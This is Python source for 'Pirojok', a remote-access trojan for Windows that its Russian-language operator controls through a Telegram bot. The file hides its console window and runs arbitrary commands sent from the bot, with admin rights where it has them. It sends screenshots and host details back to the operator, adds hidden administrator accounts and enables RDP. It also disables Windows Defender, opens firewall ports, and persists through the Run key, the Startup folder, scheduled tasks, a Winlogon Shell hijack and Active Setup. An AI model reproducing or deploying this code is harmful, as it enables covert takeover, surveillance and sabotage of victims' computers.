#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Пирожок - вкусное блюдо для удаленного управления
Версия 3.2 - с админ-командами, автозагрузкой через explorer и task scheduler
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image
import io
import ctypes
import winreg
import tempfile
import uuid

# Конфигурация
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class Pirojok:
    """Главный класс нашего пирожка"""
    
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "3.2.0"
        self.command_timeout = 60
        self.admin_mode = self.check_admin()
        self.startup_time = datetime.now()
        
        # Создаём файл-маркер для отслеживания запусков
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
    # ========== ПРОВЕРКА ПРАВ ==========
    
    def check_admin(self):
        """Проверка прав администратора"""
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def request_admin(self):
        """Запрос прав администратора (один раз при запуске)"""
        try:
            if self.check_admin():
                self.admin_mode = True
                return True
            
            if platform.system() != "Windows":
                return False
            
            if getattr(sys, 'frozen', False):
                executable = sys.executable
                params = ' '.join(sys.argv[1:])
            else:
                executable = sys.executable
                params = ' '.join([sys.argv[0]] + sys.argv[1:])
            
            with open(self.marker_file, 'w') as f:
                f.write(f"admin_requested:{datetime.now().isoformat()}")
            
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", executable, params, None, 1
            )
            
            if result > 32:
                self.send_message(self.owner_id, "👑 Запрашиваю права администратора...")
                sys.exit(0)
            else:
                self.send_message(self.owner_id, "❌ Не удалось получить права администратора")
                return False
                
        except Exception as e:
            self.send_message(self.owner_id, f"❌ Ошибка запроса прав: {e}")
            return False
    
    # ========== АДМИН-КОМАНДЫ ==========
    
    def run_as_admin_command(self, command):
        """Выполнение команды с правами администратора"""
        try:
            if not self.admin_mode:
                return "❌ Нет прав администратора. Используйте 'admin' сначала"
            
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    f'sudo {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def create_admin_user(self, username, password):
        """Создание пользователя с правами администратора"""
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
            result = self.run_as_admin_command(cmd)
            return f"👤 Создан пользователь {username}\n{result}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def enable_rdp(self):
        """Включение удаленного рабочего стола"""
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            commands = [
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                'sc config TermService start= auto',
                'net start TermService'
            ]
            
            for cmd in commands:
                self.run_as_admin_command(cmd)
            
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"✅ RDP включен\nIP: {ip}\nПорт: 3389"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def disable_defender(self):
        """Отключение Windows Defender"""
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            ]
            
            for cmd in commands:
                self.run_as_admin_command(cmd)
            
            return "✅ Windows Defender отключен"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_firewall_rule(self, port, name="Pirojok"):
        """Добавление правила в фаервол"""
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
            self.run_as_admin_command(cmd)
            return f"✅ Правило добавлено для порта {port}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    # ========== АВТОЗАГРУЗКА ==========
    
    def add_to_startup_registry(self):
        """Добавление в реестр (HKCU Run)"""
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
            
            return "✅ Добавлено в реестр (HKCU\\Run)"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_to_startup_folder(self):
        """Добавление в папку автозагрузки"""
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            startup_folder = os.path.join(
                os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            # Создаём ярлык через VBS
            vbs_script = f'''
            Set oWS = WScript.CreateObject("WScript.Shell")
            sLinkFile = "{startup_folder}\\Pirojok.lnk"
            Set oLink = oWS.CreateShortcut(sLinkFile)
            oLink.TargetPath = "{exe_path}"
            oLink.Save
            '''
            
            vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
            
            subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
            os.remove(vbs_path)
            
            return "✅ Добавлено в папку автозагрузки"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_to_task_scheduler(self):
        """Добавление в планировщик заданий (при входе пользователя)"""
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            task_name = "PirojokStartup"
            cmd = [
                'schtasks', '/create', '/tn', task_name,
                '/tr', f'"{exe_path}"',
                '/sc', 'onlogon',
                '/rl', 'highest',
                '/f'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                return "✅ Добавлено в планировщик (при входе)"
            else:
                return f"❌ Ошибка: {result.stderr}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_to_task_startup(self):
        """Добавление в планировщик (при старте системы)"""
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            task_name = "PirojokSystemStart"
            cmd = [
                'schtasks', '/create', '/tn', task_name,
                '/tr', f'"{exe_path}"',
                '/sc', 'onstart',
                '/ru', 'SYSTEM',
                '/rl', 'highest',
                '/f'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                return "✅ Добавлено в планировщик (при старте системы)"
            else:
                return f"❌ Ошибка: {result.stderr}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_to_explorer(self):
        """Запуск вместе с explorer.exe (через Shell-расширение)"""
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            # Добавляем в Shell
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            key = winreg.HKEY_LOCAL_MACHINE
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                # Получаем текущее значение Shell
                try:
                    current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
                except:
                    current_shell = "explorer.exe"
                
                # Добавляем наш пирожок
                new_shell = f"{exe_path}, {current_shell}"
                winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
            
            return "✅ Добавлено в Shell (запуск с explorer.exe)"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_to_active_setup(self):
        """Добавление в Active Setup (для всех пользователей)"""
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            guid = str(uuid.uuid4())
            key_path = f"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}"
            key = winreg.HKEY_LOCAL_MACHINE
            
            with winreg.CreateKey(key, key_path) as regkey:
                winreg.SetValueEx(regkey, "StubPath", 0, winreg.REG_SZ, f'"{exe_path}"')
                winreg.SetValueEx(regkey, "Version", 0, winreg.REG_SZ, "1,0,0,0")
            
            return "✅ Добавлено в Active Setup (для всех пользователей)"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def remove_all_startup(self):
        """Удаление из всех мест автозагрузки"""
        results = []
        
        # Удаляем из реестра
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "Pirojok")
            results.append("✅ Удалено из реестра")
        except:
            results.append("❌ Не найдено в реестре")
        
        # Удаляем из планировщика
        subprocess.run(['schtasks', '/delete', '/tn', 'PirojokStartup', '/f'], capture_output=True)
        subprocess.run(['schtasks', '/delete', '/tn', 'PirojokSystemStart', '/f'], capture_output=True)
        results.append("✅ Удалено из планировщика")
        
        return "\n".join(results)
    
    # ========== ОСНОВНЫЕ ФУНКЦИИ ==========
    
    def send_message(self, chat_id, text):
        try:
            url = f"{self.base_url}/sendMessage"
            data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        try:
            url = f"{self.base_url}/sendPhoto"
            files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": caption}
            requests.post(url, files=files, data=data, timeout=30)
        except:
            pass
    
    def get_system_info(self):
        info = []
        info.append(f"🥧 <b>ПИРОЖОК ИСПЕКСЯ!</b>")
        info.append(f"🍽 Версия: {self.version}")
        info.append(f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"💻 Хост: {socket.gethostname()}")
        info.append(f"👨‍🍳 Повар: {getpass.getuser()}")
        info.append(f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}")
        try:
            info.append(f"📍 IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"📍 IP: неизвестен")
        info.append(f"⚙️ ОС: {platform.system()} {platform.release()}")
        info.append(f"🔧 Архитектура: {platform.machine()}")
        
        uptime = datetime.now() - self.startup_time
        info.append(f"⏱ Работаю: {str(uptime).split('.')[0]}")
        
        return "\n".join(info)
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except:
            return None
    
    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                if command.lower().startswith("start "):
                    subprocess.Popen(command, shell=True)
                    return f"✅ Запущено: {command}"
                
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    # ========== МОМЕНТАЛЬНЫЕ КОМАНДЫ ==========
    
    def shutdown_instant(self):
        """Моментальное выключение"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /f /t 0")
            else:
                os.system("shutdown -h now")
            return "💥 Выключаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def reboot_instant(self):
        """Моментальная перезагрузка"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /f /t 0")
            else:
                os.system("reboot -f")
            return "⚡ Перезагружаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def shutdown_emergency(self):
        """Аварийное выключение"""
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            os.system("taskkill /f /im *")
            os.system("shutdown /s /f /t 0")
            
            return "☠️ АВАРИЙНОЕ ВЫКЛЮЧЕНИЕ!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    # ========== ЗАПУСК ПРИ СТАРТЕ ==========
    
    def on_system_startup(self):
        """Действия при запуске системы"""
        try:
            # Проверяем маркер
            if os.path.exists(self.marker_file):
                os.remove(self.marker_file)
                return
            
            # Отправляем уведомление
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"🥧 <b>Пирожок испекся!</b>\n\n"
            message += f"📅 Время включения: {boot_time}\n"
            message += f"💻 Хост: {socket.gethostname()}\n"
            message += f"👤 Пользователь: {getpass.getuser()}\n"
            message += f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}\n"
            
            self.send_message(self.owner_id, message)
            
            # Скриншот
            time.sleep(5)
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "🥧 Рабочий стол после включения")
            
        except Exception as e:
            print(f"Startup error: {e}")
    
    # ========== ОБРАБОТКА КОМАНД ==========
    
    def process_command(self, text, chat_id):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "⛔ Не для вас!")
            return
        
        # Админ-команды
        admin_commands = ["admin_cmd", "winlogon_add", "task_startup", "active_setup", 
                         "create_user", "enable_rdp", "disable_defender", "add_rule"]
        cmd_type = text.split()[0] if text else ""
        
        if cmd_type in admin_commands and not self.admin_mode:
            self.send_message(chat_id, "👑 Эта команда требует прав администратора. Сначала используйте 'admin'")
            return
        
        # Основные команды
        if text.startswith("cmd"):
            cmd = text[3:].strip()
            if cmd:
                self.send_message(chat_id, f"🔄 Выполняю: {cmd}")
                result = self.execute_command(cmd)
                
                if len(result) > 4000:
                    for i in range(0, len(result), 3500):
                        part = result[i:i+3500]
                        self.send_message(chat_id, f"📄 Часть {i//3500 + 1}:\n{part}")
                else:
                    self.send_message(chat_id, f"🥘 Результат:\n{result}")
            else:
                self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
        
        elif text.startswith("admin_cmd"):
            cmd = text[9:].strip()
            if cmd:
                self.send_message(chat_id, f"👑 Выполняю: {cmd}")
                result = self.run_as_admin_command(cmd)
                self.send_message(chat_id, f"👑 Результат:\n{result[:3500]}")
            else:
                self.send_message(chat_id, "⚠️ Используйте: admin_cmd <команда>")
        
        elif text == "admin":
            if self.admin_mode:
                self.send_message(chat_id, "👑 Уже есть права администратора!")
            else:
                self.send_message(chat_id, "🔄 Запрашиваю права...")
                self.request_admin()
        
        elif text == "admin_check":
            self.send_message(chat_id, f"👑 Права: {'ЕСТЬ' if self.admin_mode else 'НЕТ'}")
        
        # Админ-утилиты
        elif text.startswith("create_user"):
            parts = text.split()
            if len(parts) == 3:
                result = self.create_admin_user(parts[1], parts[2])
                self.send_message(chat_id, result)
            else:
                self.send_message(chat_id, "⚠️ Используйте: create_user username password")
        
        elif text == "enable_rdp":
            result = self.enable_rdp()
            self.send_message(chat_id, result)
        
        elif text == "disable_defender":
            result = self.disable_defender()
            self.send_message(chat_id, result)
        
        elif text.startswith("add_rule"):
            parts = text.split()
            if len(parts) >= 2:
                port = parts[1]
                name = parts[2] if len(parts) > 2 else "Pirojok"
                result = self.add_firewall_rule(port, name)
                self.send_message(chat_id, result)
            else:
                self.send_message(chat_id, "⚠️ Используйте: add_rule <port> [name]")
        
        # Автозагрузка
        elif text == "startup_reg":
            result = self.add_to_startup_registry()
            self.send_message(chat_id, result)
        
        elif text == "startup_folder":
            result = self.add_to_startup_folder()
            self.send_message(chat_id, result)
        
        elif text == "task_logon":
            result = self.add_to_task_scheduler()
            self.send_message(chat_id, result)
        
        elif text == "task_startup":
            result = self.add_to_task_startup()
            self.send_message(chat_id, result)
        
        elif text == "explorer_shell":
            result = self.add_to_explorer()
            self.send_message(chat_id, result)
        
        elif text == "active_setup":
            result = self.add_to_active_setup()
            self.send_message(chat_id, result)
        
        elif text == "startup_remove_all":
            result = self.remove_all_startup()
            self.send_message(chat_id, result)
        
        # Моментальные команды
        elif text == "shutdown_now":
            result = self.shutdown_instant()
            self.send_message(chat_id, result)
        
        elif text == "reboot_now":
            result = self.reboot_instant()
            self.send_message(chat_id, result)
        
        elif text == "shutdown_emergency":
            result = self.shutdown_emergency()
            self.send_message(chat_id, result)
        
        # Обычные команды
        elif text == "shutdown":
            self.send_message(chat_id, "💤 Выключение через 5 секунд...")
            if platform.system() == "Windows":
                os.system("shutdown /s /t 5")
            else:
                os.system("sudo shutdown -h +1")
        
        elif text == "reboot":
            self.send_message(chat_id, "🔄 Перезагрузка через 5 секунд...")
            if platform.system() == "Windows":
                os.system("shutdown /r /t 5")
            else:
                os.system("sudo reboot")
        
        elif text == "abort":
            if platform.system() == "Windows":
                os.system("shutdown /a")
                self.send_message(chat_id, "✅ Выключение отменено")
            else:
                self.send_message(chat_id, "❌ Отмена только для Windows")
        
        elif text.startswith("website"):
            url = text[7:].strip()
            if url:
                if not url.startswith(("http://", "https://")):
                    url = "https://" + url
                if platform.system() == "Windows":
                    os.system(f"start {url}")
                else:
                    os.system(f"xdg-open {url}")
                self.send_message(chat_id, f"✅ Открыт сайт: {url}")
            else:
                self.send_message(chat_id, "⚠️ Используйте: website <url>")
        
        elif text == "shot":
            self.send_message(chat_id, "📸 Фоткаю...")
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(chat_id, screenshot, "🥧 Скриншот")
            else:
                self.send_message(chat_id, "❌ Не удалось")
        
        elif text == "info":
            self.send_message(chat_id, self.get_system_info())
        
        elif text == "help" or text == "menu":
            help_text = """
🥧 <b>ПИРОЖОК v3.2 МЕНЮ:</b>

<b>⚡ МОМЕНТАЛЬНО:</b>
• shutdown_now - выключить сейчас
• reboot_now - перезагрузить сейчас
• shutdown_emergency - аварийно

<b>👑 АДМИН-КОМАНДЫ:</b>
• admin - запросить права
• admin_cmd [команда] - команда от админа
• create_user user pass - создать админа
• enable_rdp - включить RDP
• disable_defender - отключить Defender
• add_rule port [name] - правило FW

<b>🔄 АВТОЗАПУСК:</b>
• startup_reg - в реестр
• startup_folder - в папку
• task_logon - планировщик (вход)
• task_startup - планировщик (старт)
• explorer_shell - с explorer.exe
• active_setup - для всех юзеров
• startup_remove_all - удалить всё

<b>📸 ОСНОВНЫЕ:</b>
• cmd [команда] - команда
• website [url] - открыть сайт
• shot - скриншот
• info - информация
• reboot/shutdown - с задержкой
• abort - отмена
            """
            self.send_message(chat_id, help_text)
        
        else:
            self.send_message(chat_id, "❓ Нет такой команды")
    
    def main_loop(self):
        """Основной цикл"""
        self.on_system_startup()
        
        if not os.path.exists(self.marker_file):
            self.send_message(self.owner_id, self.get_system_info())
        
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {
                    "offset": self.last_update_id + 1,
                    "timeout": 30,
                    "allowed_updates": ["message"]
                }
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(
                                target=self.process_command,
                                args=(
                                    update["message"]["text"],
                                    update["message"]["chat"]["id"]
                                )
                            )
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        try:
            self.admin_mode = self.check_admin()
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "🥧 Пирожок убрали в холодильник")

if __name__ == "__main__":
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    pirojok = Pirojok()
    pirojok.run()
